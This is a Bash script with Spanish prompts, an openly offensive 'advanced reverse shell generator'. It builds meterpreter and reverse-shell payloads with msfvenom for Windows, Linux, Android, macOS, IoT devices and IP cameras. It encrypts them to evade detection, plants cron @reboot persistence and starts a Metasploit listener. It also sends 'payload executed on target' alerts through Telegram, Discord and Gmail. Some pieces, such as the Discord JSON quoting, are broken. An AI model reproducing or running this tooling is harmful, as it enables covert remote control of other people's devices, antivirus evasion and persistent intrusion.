#!/bin/bash

# Colores para salida de texto
GREEN="\e[32m"
RED="\e[31m"
CYAN="\e[36m"
YELLOW="\e[33m"
RESET="\e[0m"

# Directorios y archivos esenciales
LOG_DIR="./logs"
PAYLOAD_DIR="./payloads"
CONFIG_FILE="./config.cfg"
STATS_FILE="./stats.log"
mkdir -p "$LOG_DIR" "$PAYLOAD_DIR"

# Dependencias requeridas
DEPENDENCIAS=("bash" "curl" "wget" "python3" "msfvenom" "tmux" "zenity" "jq")

# Verificar e instalar dependencias
check_dependencies() {
    echo -e "${CYAN}[INFO] Verificando dependencias...${RESET}"
    for dep in "${DEPENDENCIAS[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${YELLOW}[WARN] Falta dependencia: $dep. Instalando...${RESET}"
            sudo apt-get install -y "$dep" || echo -e "${RED}[ERROR] No se pudo instalar $dep.${RESET}"
        else
            echo -e "${GREEN}[OK] $dep está instalado.${RESET}"
        fi
    done
}

# Generación de payloads con msfvenom y ofuscación personalizada
generate_payload() {
    echo -e "${CYAN}[INFO] Generando payload indetectable...${RESET}"
    read -p "Ingrese la IP de conexión reversa: " lhost
    read -p "Ingrese el puerto de conexión reversa: " lport
    echo -e "${CYAN}Seleccione el sistema objetivo:${RESET}"
    echo -e "1. Windows
2. Linux
3. Android
4. macOS
5. IoT
6. Cámara IP"
    read -p "Opción: " target

    # Selección de payloads
    case $target in
        1) payload="windows/meterpreter_reverse_tcp" ; platform="windows" ; arch="x86" ; ext="exe" ;;
        2) payload="linux/x64/meterpreter_reverse_tcp" ; platform="linux" ; arch="x64" ; ext="elf" ;;
        3) payload="android/meterpreter/reverse_tcp" ; platform="android" ; arch="dalvik" ; ext="apk" ;;
        4) payload="osx/x64/meterpreter_reverse_tcp" ; platform="osx" ; arch="x64" ; ext="macho" ;;
        5) payload="generic/shell_reverse_tcp" ; platform="generic" ; arch="x86" ; ext="bin" ;;
        6) payload="generic/shell_reverse_tcp" ; platform="generic" ; arch="x86" ; ext="bin" ;;
        *) echo -e "${RED}[ERROR] Opción inválida.${RESET}" ; return ;;
    esac

    # Generar el payload con msfvenom
    echo -e "${CYAN}[INFO] Generando payload con msfvenom...${RESET}"
    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f raw -a "$arch" --platform "$platform" > "$PAYLOAD_DIR/raw_payload.bin"

    # Verificar si se generó correctamente
    if [ ! -f "$PAYLOAD_DIR/raw_payload.bin" ]; then
        echo -e "${RED}[ERROR] Fallo al generar el payload crudo.${RESET}"
        return
    fi

    # Aplicar cifrado al payload
    echo -e "${CYAN}[INFO] Aplicando cifrado AES-256-CBC...${RESET}"
    openssl enc -aes-256-cbc -salt -in "$PAYLOAD_DIR/raw_payload.bin" -out "$PAYLOAD_DIR/payload.$ext" -k "password_secreto"

    # Verificar si el payload cifrado existe
    if [ -f "$PAYLOAD_DIR/payload.$ext" ]; then
        echo "$(date): Payload $payload generado en $PAYLOAD_DIR/payload.$ext" >> "$STATS_FILE"
        echo -e "${GREEN}[SUCCESS] Payload generado y cifrado: $PAYLOAD_DIR/payload.$ext${RESET}"
        rm "$PAYLOAD_DIR/raw_payload.bin" # Eliminar el payload sin cifrar
    else
        echo -e "${RED}[ERROR] Fallo al aplicar cifrado al payload.${RESET}"
    fi
}


# Configuración de persistencia avanzada
setup_persistence() {
    echo -e "${CYAN}[INFO] Configurando persistencia...${RESET}"
    read -p "Ingrese la ruta completa del payload: " payload_path
    cronjob="@reboot $payload_path"
    (crontab -l 2>/dev/null; echo "$cronjob") | crontab -
    echo -e "${GREEN}[SUCCESS] Persistencia configurada.${RESET}"
}

# Notificaciones en Telegram
send_telegram_notification() {
    echo -e "${CYAN}[INFO] Configurando notificaciones de Telegram...${RESET}"
    read -p "Ingrese su token de Telegram: " telegram_token
    read -p "Ingrese su ID de chat: " chat_id
    message="Payload ejecutado exitosamente en el objetivo."
    curl -s -X POST "https://api.telegram.org/bot${telegram_token}/sendMessage" -d "chat_id=${chat_id}&text=${message}"
    echo -e "${GREEN}[SUCCESS] Notificación enviada a Telegram.${RESET}"
}

# Notificaciones en Discord
send_discord_notification() {
    echo -e "${CYAN}[INFO] Configurando notificaciones de Discord...${RESET}"
    read -p "Ingrese su Webhook de Discord: " discord_webhook
    message="Payload ejecutado exitosamente en el objetivo."
    curl -H "Content-Type: application/json" -X POST -d "{"content": "$message"}" "$discord_webhook"
    echo -e "${GREEN}[SUCCESS] Notificación enviada a Discord.${RESET}"
}

# Alerta por Gmail
send_gmail_alert() {
    echo -e "${CYAN}[INFO] Configurando alerta por Gmail...${RESET}"
    read -p "Ingrese su correo electrónico: " email
    read -p "Ingrese su contraseña de Gmail (modo app-password): " password
    read -p "Ingrese el destinatario: " recipient
    message="Se ejecutó el payload en el objetivo."
    echo "$message" | mail -s "Alerta de Payload" -aFrom:"$email" "$recipient" --user="$email:$password"
    echo -e "${GREEN}[SUCCESS] Alerta enviada por Gmail.${RESET}"
}

# Consola automática con Metasploit
start_reverse_shell() {
    echo -e "${CYAN}[INFO] Configurando consola automática...${RESET}"
    tmux new-session -d -s reverse_shell "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_tcp; set LHOST <TU_IP>; set LPORT <PUERTO>; exploit'"
    tmux attach-session -t reverse_shell
}

# Menú principal
main_menu() {
    while true; do
        clear
        echo -e "${GREEN}=========================================="
        echo -e " Generador de Reverse Shell Avanzado"
        echo -e "==========================================${RESET}"
        echo -e "1. Verificar dependencias"
        echo -e "2. Generar payload indetectable"
        echo -e "3. Configurar persistencia"
        echo -e "4. Configurar notificaciones (Telegram)"
        echo -e "5. Configurar notificaciones (Discord)"
        echo -e "6. Enviar alerta por Gmail"
        echo -e "7. Consola automática"
        echo -e "8. Salir"
        read -p "Seleccione una opción: " option

        case $option in
            1) check_dependencies ;;
            2) generate_payload ;;
            3) setup_persistence ;;
            4) send_telegram_notification ;;
            5) send_discord_notification ;;
            6) send_gmail_alert ;;
            7) start_reverse_shell ;;
            8) echo -e "${CYAN}Saliendo...${RESET}" ; exit 0 ;;
            *) echo -e "${RED}[ERROR] Opción inválida.${RESET}" ;;
        esac
        read -p "Presione Enter para continuar..."
    done
}

# Iniciar script
main_menu
